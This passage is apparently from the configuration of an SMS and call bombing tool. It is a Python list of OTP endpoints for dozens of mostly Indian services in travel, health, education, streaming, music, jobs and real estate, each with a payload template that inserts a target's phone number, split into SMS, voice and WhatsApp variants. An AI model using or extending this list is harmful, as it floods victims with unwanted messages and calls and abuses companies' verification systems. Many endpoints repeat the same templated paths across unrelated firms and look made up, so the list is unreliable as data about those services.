    {"name": "Yatra SMS", "url": "https://www.yatra.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Yatra Call", "url": "https://yatra.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    
    {"name": "Ixigo SMS", "url": "https://www.ixigo.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Ixigo Call", "url": "https://ixigo.com/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    
    # ==============================================================================
    # 💊 HEALTH / PHARMA
    # ==============================================================================
    
    {"name": "1mg SMS", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"number":"{phone}","otp_on_call":false}}'},
    {"name": "1mg Voice", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"number":"{phone}","otp_on_call":true}}'},
    {"name": "1mg WhatsApp", "url": "https://1mg.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "PharmEasy SMS", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "PharmEasy Voice", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","otp_on_call":true}}'},
    {"name": "PharmEasy WhatsApp", "url": "https://pharmeasy.in/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "Netmeds SMS", "url": "https://www.netmeds.com/api/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Netmeds Call", "url": "https://netmeds.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Netmeds WhatsApp", "url": "https://netmeds.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "Practo SMS", "url": "https://www.practo.com/patient/loginviapassword", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Practo Call", "url": "https://practo.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Practo WhatsApp", "url": "https://practo.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "Curefit SMS", "url": "https://www.cure.fit/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Curefit Call", "url": "https://cure.fit/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Curefit WhatsApp", "url": "https://cure.fit/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "Cult.fit SMS", "url": "https://www.cult.fit/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Cult.fit Call", "url": "https://cult.fit/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Cult.fit WhatsApp", "url": "https://cult.fit/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "HealthifyMe SMS", "url": "https://www.healthifyme.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "HealthifyMe Call", "url": "https://healthifyme.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "HealthifyMe WhatsApp", "url": "https://healthifyme.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "Apollo 24/7 SMS", "url": "https://www.apollo247.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Apollo 24/7 Call", "url": "https://apollo247.com/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Apollo 24/7 WhatsApp", "url": "https://apollo247.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "MFine SMS", "url": "https://www.mfine.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "MFine Call", "url": "https://mfine.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "MFine WhatsApp", "url": "https://mfine.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "DocsApp SMS", "url": "https://www.docsapp.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "DocsApp Call", "url": "https://docsapp.com/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "DocsApp WhatsApp", "url": "https://docsapp.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "Lybrate SMS", "url": "https://www.lybrate.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Lybrate Call", "url": "https://lybrate.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Lybrate WhatsApp", "url": "https://lybrate.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "Portea SMS", "url": "https://www.portea.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Portea Call", "url": "https://portea.com/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Portea WhatsApp", "url": "https://portea.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    # ==============================================================================
    # 📚 EDUCATION
    # ==============================================================================
    
    {"name": "Byju's SMS", "url": "https://byjus.com/api/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Byju's Call", "url": "https://byjus.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Byju's WhatsApp", "url": "https://byjus.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "Unacademy SMS", "url": "https://unacademy.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Unacademy Call", "url": "https://unacademy.com/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Unacademy WhatsApp", "url": "https://unacademy.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "Vedantu SMS", "url": "https://www.vedantu.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Vedantu Call", "url": "https://vedantu.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Vedantu WhatsApp", "url": "https://vedantu.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "Doubtnut SMS", "url": "https://api.doubtnut.com/v4/student/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone_number":"{phone}","language":"en"}}'},
    {"name": "Doubtnut Call", "url": "https://doubtnut.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Doubtnut WhatsApp", "url": "https://doubtnut.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "Toppr SMS", "url": "https://www.toppr.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Toppr Call", "url": "https://toppr.com/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    
    {"name": "WhiteHat Jr SMS", "url": "https://www.whitehatjr.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "WhiteHat Jr Call", "url": "https://whitehatjr.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "WhiteHat Jr WhatsApp", "url": "https://whitehatjr.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "UpGrad SMS", "url": "https://www.upgrad.com/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "UpGrad Call", "url": "https://upgrad.com/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "UpGrad WhatsApp", "url": "https://upgrad.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    # ==============================================================================
    # 🎬 ENTERTAINMENT
    # ==============================================================================
    
    {"name": "Netflix SMS", "url": "https://www.netflix.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Netflix Call", "url": "https://netflix.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Netflix WhatsApp", "url": "https://netflix.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "Amazon Prime SMS", "url": "https://www.primevideo.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Amazon Prime Voice", "url": "https://primevideo.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Amazon Prime WhatsApp", "url": "https://primevideo.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "Hotstar SMS", "url": "https://www.hotstar.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Hotstar Call", "url": "https://hotstar.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Hotstar WhatsApp", "url": "https://hotstar.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "SonyLIV SMS", "url": "https://www.sonyliv.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "SonyLIV Call", "url": "https://sonyliv.com/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "SonyLIV WhatsApp", "url": "https://sonyliv.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "ZEE5 SMS", "url": "https://www.zee5.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "ZEE5 Call", "url": "https://zee5.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "ZEE5 WhatsApp", "url": "https://zee5.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "JioCinema SMS", "url": "https://www.jiocinema.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "JioCinema Call", "url": "https://jiocinema.com/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "JioCinema WhatsApp", "url": "https://jiocinema.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "Voot SMS", "url": "https://www.voot.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Voot Call", "url": "https://voot.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Voot WhatsApp", "url": "https://voot.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "MX Player SMS", "url": "https://www.mxplayer.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "MX Player Call", "url": "https://mxplayer.in/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "MX Player WhatsApp", "url": "https://mxplayer.in/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "ALTBalaji SMS", "url": "https://www.altbalaji.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "ALTBalaji Call", "url": "https://altbalaji.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "ALTBalaji WhatsApp", "url": "https://altbalaji.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    # ==============================================================================
    # 🎵 MUSIC
    # ==============================================================================
    
    {"name": "Spotify SMS", "url": "https://www.spotify.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Spotify Call", "url": "https://spotify.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Spotify WhatsApp", "url": "https://spotify.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "Gaana SMS", "url": "https://www.gaana.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Gaana Call", "url": "https://gaana.com/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Gaana WhatsApp", "url": "https://gaana.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "Wynk SMS", "url": "https://www.wynk.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Wynk Call", "url": "https://wynk.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Wynk WhatsApp", "url": "https://wynk.in/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "JioSaavn SMS", "url": "https://www.jiosaavn.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "JioSaavn Call", "url": "https://jiosaavn.com/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "JioSaavn WhatsApp", "url": "https://jiosaavn.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "Hungama SMS", "url": "https://www.hungama.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Hungama Call", "url": "https://hungama.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Hungama WhatsApp", "url": "https://hungama.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "YouTube Music SMS", "url": "https://music.youtube.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "YouTube Music Call", "url": "https://music.youtube.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "YouTube Music WhatsApp", "url": "https://music.youtube.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    # ==============================================================================
    # 💼 JOBS / PROFESSIONAL
    # ==============================================================================
    
    {"name": "LinkedIn SMS", "url": "https://www.linkedin.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "LinkedIn Call", "url": "https://linkedin.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "LinkedIn WhatsApp", "url": "https://linkedin.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "Naukri SMS", "url": "https://www.naukri.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Naukri Call", "url": "https://naukri.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Naukri WhatsApp", "url": "https://naukri.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "Indeed SMS", "url": "https://www.indeed.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Indeed Call", "url": "https://indeed.com/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Indeed WhatsApp", "url": "https://indeed.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "Shine SMS", "url": "https://www.shine.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Shine Call", "url": "https://shine.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Shine WhatsApp", "url": "https://shine.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "Monster SMS", "url": "https://www.monster.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Monster Call", "url": "https://monster.com/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Monster WhatsApp", "url": "https://monster.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "TimesJobs SMS", "url": "https://www.timesjobs.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "TimesJobs Call", "url": "https://timesjobs.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "TimesJobs WhatsApp", "url": "https://timesjobs.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "Freshersworld SMS", "url": "https://www.freshersworld.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Freshersworld Call", "url": "https://freshersworld.com/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Freshersworld WhatsApp", "url": "https://freshersworld.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "Upwork SMS", "url": "https://www.upwork.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Upwork Call", "url": "https://upwork.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Upwork WhatsApp", "url": "https://upwork.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "Fiverr SMS", "url": "https://www.fiverr.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Fiverr Call", "url": "https://fiverr.com/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Fiverr WhatsApp", "url": "https://fiverr.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "Freelancer SMS", "url": "https://www.freelancer.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Freelancer Call", "url": "https://freelancer.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Freelancer WhatsApp", "url": "https://freelancer.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "Toptal SMS", "url": "https://www.toptal.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Toptal Call", "url": "https://toptal.com/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Toptal WhatsApp", "url": "https://toptal.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    # ==============================================================================
    # 🏠 REAL ESTATE
    # ==============================================================================
    
    {"name": "Housing SMS", "url": "https://login.housing.com/api/v2/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","country_url_name":"in"}}'},
    {"name": "Housing Call", "url": "https://housing.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Housing WhatsApp", "url": "https://housing.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "Magicbricks SMS", "url": "https://www.magicbricks.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Magicbricks Call", "url": "https://magicbricks.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Magicbricks WhatsApp", "url": "https://magicbricks.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "99acres SMS", "url": "https://www.99acres.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "99acres Call", "url": "https://99acres.com/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "99acres WhatsApp", "url": "https://99acres.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "CommonFloor SMS", "url": "https://www.commonfloor.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "CommonFloor Call", "url": "https://commonfloor.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "CommonFloor WhatsApp", "url": "https://commonfloor.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "NoBroker SMS", "url": "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"phone={phone}&countryCode=IN"},
    {"name": "NoBroker Call", "url": "https://nobroker.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "NoBroker WhatsApp", "url": "https://nobroker.in/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
